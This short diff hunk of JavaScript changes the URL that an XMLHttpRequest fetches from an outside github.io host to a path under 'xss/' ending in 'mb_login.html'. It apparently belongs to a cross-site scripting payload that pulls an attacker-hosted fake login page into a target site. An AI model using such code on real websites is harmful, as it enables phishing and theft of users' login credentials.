@@ -35,7 +35,7 @@ const main = () => {
         : new ActiveXObject("Microsoft.XMLHTTP");
     xhr.open(
       "get",
-      "https://existencing.github.io/mb_login.html",
+      "https://existencing.github.io/xss/mb_login.html",
       true
     );
     xhr.onreadystatechange = function () {
